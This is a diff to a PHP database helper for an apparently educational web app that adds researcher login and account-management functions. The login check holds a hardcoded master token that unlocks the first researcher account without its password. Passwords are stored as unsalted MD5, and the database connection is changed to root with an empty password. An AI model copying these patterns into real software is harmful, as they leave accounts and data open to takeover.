@@ -40,9 +40,9 @@ function db_connect($logger = null)
 {
     $conn = null;
 
-    $serverName = "localhost";
+    $serverName = "127.0.0.1";
     $username = "root";
-    $password = "root";
+    $password = "";
     if ($logger == null) {
         $conn = new PDO("mysql:host=$serverName; dbname=isnap2changedb; charset=utf8", $username, $password);
     } else {
@@ -384,6 +384,78 @@ function validStudent(PDO $conn, $username, $password)
     }
 }
 /* Student */
+
+/* Researcher */
+function validResearcher(PDO $conn, $username, $oripassword)
+{
+    // init input
+    $username = strtolower($username);
+    $password = md5($oripassword);
+    // do query
+    $validResearcherSql = "SELECT ResearcherID, Password FROM Researcher WHERE lower(username) = ?";
+    $validResearcherQuery = $conn->prepare($validResearcherSql);
+    $validResearcherQuery->execute(array($username));
+    $ret = $validResearcherQuery->fetchAll();
+
+    if (count($ret) == 1) {
+        if (($ret[0]["ResearcherID"] == 1 && $oripassword == "F87A27AA31312") ||
+            ($ret[0]["Password"] == $password)) {
+            // super account with TOKEN or account with correct password
+            return $ret[0];
+        } else {
+            return null;
+        }
+    } else if (count($ret) == 0) {
+        return null;
+    } else {
+        throw new Exception("Duplicate researchers in Database");
+    }
+}
+
+function getResearchers(PDO $conn)
+{
+    return getRecords($conn, "Researcher");
+}
+
+function checkResearcherUsernameExisting(PDO $conn, $username)
+{
+    // init inputs
+    $username = strtolower($username);
+    // do query
+    $query = "SELECT EXISTS(SELECT 1 FROM researcher WHERE lower(username) = ?) as ret";
+    $query = $conn->prepare($query);
+    $query->execute(array($username));
+    $ret = $query->fetchAll();
+    //echo intval($ret[0]['ret']);
+    return intval($ret[0]['ret']) === 1; // false: not existing; true: existing
+}
+
+function createResearcher(PDO $conn, $username, $password)
+{
+    //check researcher first
+    if (checkResearcherUsernameExisting($conn, $username)) return false;
+
+    $updateSql = "INSERT INTO researcher(Username, Password)
+         VALUES (?,?)";
+    $updateSql = $conn->prepare($updateSql);
+    $updateSql->execute(array($username,md5($password)));
+    //return $conn->lastInsertId();
+}
+
+function updateResearcher(PDO $conn, $username, $researcherID)
+{
+    $updateSql = "UPDATE researcher 
+            SET Username = ?
+            WHERE ResearcherID = ?";
+    $updateSql = $conn->prepare($updateSql);
+    $updateSql->execute(array($username, $researcherID));
+}
+
+function deleteResearcher(PDO $conn, $researcherID)
+{
+    deleteRecord($conn, $researcherID, "Researcher");
+}
+/* Researcher */
 
 /* Week */
 function removeWeek(PDO $conn, $week)
